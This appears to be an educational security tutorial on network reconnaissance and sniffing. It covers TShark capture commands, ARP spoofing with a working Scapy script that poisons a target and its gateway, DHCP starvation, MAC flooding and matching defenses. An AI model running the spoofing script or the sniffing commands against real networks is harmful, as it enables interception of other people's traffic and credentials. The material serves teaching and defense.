# 02 - Network Reconnaissance & Sniffing

## Packet Analysis with Wireshark & TShark
Packet analysis is the first step in both network troubleshooting and reconnaissance. 

### TShark Commands
TShark is the CLI equivalent of Wireshark.

```bash
# Capture HTTP traffic on eth0
tshark -i eth0 -Y "http.request" -T fields -e http.host -e http.request.uri

# Extract DNS queries
tshark -i eth0 -f "udp port 53" -Y "dns.flags.response == 0" -T fields -e dns.qry.name
```

## ARP Spoofing Mechanics
Address Resolution Protocol (ARP) maps IP addresses to MAC addresses on a local subnet. Because ARP is stateless and lacks authentication, an attacker can send unsolicited (gratuitous) ARP replies, deceiving devices into sending traffic to the attacker's MAC address instead of the legitimate gateway.

### Scapy ARP Spoofing Script
```python
from scapy.all import *
import time

target_ip = "192.168.1.50"
gateway_ip = "192.168.1.1"

# Craft malicious ARP replies
# Tell target we are the gateway
target_packet = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff")
# Tell gateway we are the target
gateway_packet = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff")

print("Starting ARP Spoofing...")
try:
    while True:
        send(target_packet, verbose=False)
        send(gateway_packet, verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("Stopping...")
```

## DHCP Starvation & MAC Flooding
- **DHCP Starvation:** The attacker broadcasts thousands of DHCP requests with spoofed MAC addresses, exhausting the DHCP server's IP pool. Legitimate clients can no longer get IPs.
- **MAC Flooding:** The attacker sends countless frames with fake source MAC addresses. The switch's CAM table fills up, causing it to "fail open" and broadcast all frames to all ports, turning the switch into a hub and enabling sniffing.

## Defenses
- **Dynamic ARP Inspection (DAI):** Validates ARP packets against a trusted database.
- **Port Security:** Limits the number of MAC addresses per switch port.
- **DHCP Snooping:** Blocks unauthorized DHCP servers and prevents starvation.
